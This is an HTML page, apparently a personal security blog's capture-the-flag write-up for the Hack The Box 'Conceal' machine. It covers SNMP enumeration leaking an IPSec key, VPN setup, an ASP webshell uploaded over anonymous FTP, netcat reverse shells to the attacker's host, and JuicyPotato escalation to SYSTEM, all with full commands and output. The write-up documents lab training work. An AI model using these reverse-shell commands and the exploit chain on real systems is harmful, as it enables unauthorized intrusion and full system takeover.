@@ -1,0 +1,722 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Conceal - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, upload an ASP payload to gain RCE then privesc to SYSTEM using RottenPotato. Not a bad box overall, but the initial part of figuring out the IPSec configuration parameters took me a while to figure out/guess.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Conceal - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-conceal/">
+
+
+  <meta property="og:description" content="Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, upload an ASP payload to gain RCE then privesc to SYSTEM using RottenPotato. Not a bad box overall, but the initial part of figuring out the IPSec configuration parameters took me a while to figure out/guess.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-conceal/conceal_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-05-18T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-conceal/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Conceal - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Conceal - Hack The Box">
+    <meta itemprop="description" content="Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, upload an ASP payload to gain RCE then privesc to SYSTEM using RottenPotato. Not a bad box overall, but the initial part of figuring out the IPSec configuration parameters took me a while to figure out/guess.">
+    <meta itemprop="datePublished" content="May 18, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Conceal - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-05-18T00:00:00+02:00">May 18, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-conceal/conceal_logo.png" alt=""></p>
+
+<p>Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, upload an ASP payload to gain RCE then privesc to SYSTEM using RottenPotato. Not a bad box overall, but the initial part of figuring out the IPSec configuration parameters took me a while to figure out/guess</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>The box has a security rule configured that only allows clients to connect to it through an IPSec tunnel</li>
+  <li>SNMP is configured with a default <code class="language-plaintext highlighter-rouge">public</code> community string, allowing us to see the IPSec pre-shared key (PSK)</li>
+  <li>Using an IPSec client such as StrongSwan, we can connect to it but we need to only allow TCP through otherwise the Phase2 negotiation fails</li>
+  <li>Next, we can access the FTP and HTTP port on the server and locate an <code class="language-plaintext highlighter-rouge">/upload</code> directory on the IIS server</li>
+  <li>We can upload files to the webserver using the FTP anonymous user, gaining RCE with an ASP webshell</li>
+  <li>The user running the webserver has <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege so we can use JuicyPotato to elevate to SYSTEM</li>
+</ul>
+
+<h3 id="portscan">Portscan</h3>
+
+<p>Nothing shows up on the TCP nmap scan but IKE is running on UDP port 500.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>nmap <span class="nt">-sU</span> <span class="nt">-F</span> 10.10.10.116
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 22:13 EST
+Nmap scan report for conceal.htb (10.10.10.116)
+Host is up (0.027s latency).
+Not shown: 99 open|filtered ports
+PORT    STATE SERVICE
+500/udp open  isakmp
+</span></code></pre></div></div>
+
+<h3 id="snmp">SNMP</h3>
+
+<p>SNMP is running with default <code class="language-plaintext highlighter-rouge">public</code> community, we can see with <code class="language-plaintext highlighter-rouge">snmp-check</code> that the <code class="language-plaintext highlighter-rouge">contact</code> field contains the pre-shared key for the IPSec VPN.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>snmp-check 10.10.10.116
+<span class="go">snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 10.10.10.116
+  Hostname                      : Conceal
+  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
+  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
+  Location                      : -
+  Uptime snmp                   : 02:32:57.70
+  Uptime system                 : 02:32:29.67
+  System date                   : 2019-1-7 03:09:29.3
+  Domain                        : WORKGROUP
+[...]  
+</span></code></pre></div></div>
+
+<h3 id="vpn-connection">VPN connection</h3>
+
+<p>The VPN configuration was pretty tough to put together because IPSec is not very verbose when it fails to connect. The main items that we need to configure specifically are:</p>
+
+<ul>
+  <li>Phase1 transform-set: <code class="language-plaintext highlighter-rouge">3des-sha1-modp1024!</code>
+</li>
+  <li>Phase2 transform-set: <code class="language-plaintext highlighter-rouge">des-sha1!</code>
+</li>
+  <li>Connection type: <code class="language-plaintext highlighter-rouge">transport</code>
+</li>
+  <li>Protocols allowed: <code class="language-plaintext highlighter-rouge">[tcp]</code>
+</li>
+</ul>
+
+<p><strong>/etc/ipsec.conf</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config setup
+	charondebug="all"
+	uniqueids=yes
+	strictcrlpolicy=no
+
+conn %default
+	authby=secret
+
+conn conceal
+	keyexchange=ikev1
+	left=10.10.14.23
+	right=10.10.10.116
+	rightsubnet=10.10.10.116[tcp]
+	auto=add
+	ike=3des-sha1-modp1024!
+	esp=3des-sha1!
+	type=transport
+</code></pre></div></div>
+
+<p><strong>/etc/ipsec.secrets</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%any : PSK "Dudecake1!"
+</code></pre></div></div>
+
+<p>I also had to lower the MTU of the VMware eth0 interface and both OpenVPN tunnel and IPSec tunnel interfaces, to be certain that I would not have any problems sending large packets. Initially with the default MTU I had issues sending large packets during the FTP upload: the connection would freeze intermittently during the upload or even when interacting with the webshell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ip a
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1440 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+[...]
+7: ip_vti0@NONE: &lt;NOARP&gt; mtu 1360 qdisc noop state DOWN group default qlen 1000
+[...]
+17: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1380 qdisc pfifo_fast state UNKNOWN group default qlen 100
+</code></pre></div></div>
+
+<p>Once everything is configured, we can successfully connect to the VPN:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>ipsec up conceal
+<span class="go">initiating Main Mode IKE_SA conceal[1] to 10.10.10.116
+generating ID_PROT request 0 [ SA V V V V V ]
+sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (176 bytes)
+received packet: from 10.10.10.116[500] to 10.10.14.23[500] (208 bytes)
+parsed ID_PROT response 0 [ SA V V V V V V ]
+received MS NT5 ISAKMPOAKLEY vendor ID
+received NAT-T (RFC 3947) vendor ID
+received draft-ietf-ipsec-nat-t-ike-02\n vendor ID
+received FRAGMENTATION vendor ID
+received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
+received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
+selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
+generating ID_PROT request 0 [ KE No NAT-D NAT-D ]
+sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (244 bytes)
+received packet: from 10.10.10.116[500] to 10.10.14.23[500] (260 bytes)
+parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]
+generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]
+sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (100 bytes)
+received packet: from 10.10.10.116[500] to 10.10.14.23[500] (68 bytes)
+parsed ID_PROT response 0 [ ID HASH ]
+IKE_SA conceal[1] established between 10.10.14.23[10.10.14.23]...10.10.10.116[10.10.10.116]
+scheduling reauthentication in 9759s
+maximum IKE_SA lifetime 10299s
+generating QUICK_MODE request 2486327527 [ HASH SA No ID ID ]
+sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (164 bytes)
+received packet: from 10.10.10.116[500] to 10.10.14.23[500] (188 bytes)
+parsed QUICK_MODE response 2486327527 [ HASH SA No ID ID ]
+selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
+CHILD_SA conceal{1} established with SPIs c9f0dac2_i 65f81cda_o and TS 10.10.14.23/32 === 10.10.10.116/32[tcp]
+generating QUICK_MODE request 2486327527 [ HASH ]
+connection 'conceal' established successfully
+
+</span><span class="gp">#</span><span class="w"> </span>ipsec status
+<span class="go">Security Associations (1 up, 0 connecting):
+     conceal[1]: ESTABLISHED 3 seconds ago, 10.10.14.23[10.10.14.23]...10.10.10.116[10.10.10.116]
+     conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: c9f0dac2_i 65f81cda_o
+     conceal{1}:   10.10.14.23/32 === 10.10.10.116/32[tcp]
+</span></code></pre></div></div>
+
+<h3 id="2nd-portscan">2nd portscan</h3>
+
+<p>After we’re connected, we can run a portscan again and find additional ports.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sT -F 10.10.10.116
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 22:36 EST
+Nmap scan report for conceal.htb (10.10.10.116)
+Host is up (0.032s latency).
+Not shown: 95 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+80/tcp  open  http
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+</code></pre></div></div>
+
+<h3 id="gaining-rce-through-the-iis-webserver">Gaining RCE through the IIS webserver</h3>
+
+<p>The IIS server has a default page configured.</p>
+
+<p><img src="/assets/images/htb-writeup-conceal/iis_generic.png" alt=""></p>
+
+<p>Let’s use <code class="language-plaintext highlighter-rouge">gobuster</code> to find interesting stuff on the server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.116
+/upload (Status: 301)
+</code></pre></div></div>
+
+<p>Ok, so there’s an upload page and it seems that we can upload files to the IIS root directory with the FTP anonymous account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo "This is a test" &gt; test.txt
+# curl -T test.txt ftp://10.10.10.116
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    15    0     0  100    15      0     53 --:--:-- --:--:-- --:--:--    53
+# curl http://10.10.10.116/upload/test.txt
+This is a test
+</code></pre></div></div>
+
+<p>Next, let’s upload an .asp webshell so we can run commands on the server. I used the following webshell: <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl -t curl -T snow.asp ftp://10.10.10.116
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1356    0     0  100  1356      0   4237 --:--:-- --:--:-- --:--:--  4237
+</code></pre></div></div>
+
+<p>We now have RCE and we can grab the user flag from the <code class="language-plaintext highlighter-rouge">Destitute</code> user directory.</p>
+
+<p><img src="/assets/images/htb-writeup-conceal/userflag.png" alt=""></p>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>The upload directory is located here: <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\upload\snow.asp</code></p>
+
+<p>To get a proper shell, we can upload <code class="language-plaintext highlighter-rouge">nc.exe</code> and run it with <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\upload\nc.exe -e cmd.exe 10.10.14.23 80</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 80
+listening on [any] 80 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.116] 49684
+Microsoft Windows [Version 10.0.15063]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Windows\SysWOW64\inetsrv&gt;whoami
+conceal\destitute
+
+C:\Windows\SysWOW64\inetsrv&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+</code></pre></div></div>
+
+<p>Running <code class="language-plaintext highlighter-rouge">whoami /priv</code>, we see that the rights for the user will allow us to use the RottenPotato exploit to elevate to NT AUTORITY/SYSTEM.</p>
+
+<p>We need to pick the appropriat CLSID for our OS so first we’ll check which Windows version is running:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub\wwwroot\upload&gt;systeminfo
+systeminfo
+
+Host Name:                 CONCEAL
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.15063 N/A Build 15063
+</code></pre></div></div>
+
+<p>Next, we check the <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a> site for a list of CLSID for the OS.</p>
+
+<p>We’ll use <code class="language-plaintext highlighter-rouge">{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code>, for no particular reason then execute JuicyPotato and run another netcat to spawn a new reverse shell for us.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub\wwwroot\upload&gt;juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.23 443" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.23 443" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1234
+......
+[+] authresult 0
+{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+C:\inetpub\wwwroot\upload&gt;
+</code></pre></div></div>
+
+<p>And… we get a shell back as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.116] 49709
+Microsoft Windows [Version 10.0.15063]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;type c:\users\administrator\desktop\proof.txt
+type c:\users\administrator\desktop\proof.txt
+5737DD...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#asp" class="page__taxonomy-item" rel="tag">asp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ipsec" class="page__taxonomy-item" rel="tag">ipsec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rotten-tomato" class="page__taxonomy-item" rel="tag">rotten tomato</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vpn" class="page__taxonomy-item" rel="tag">vpn</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-05-18T00:00:00+02:00">May 18, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-lightweight/" class="pagination--pager" title="Lightweight - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-chaos/" class="pagination--pager" title="Chaos - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
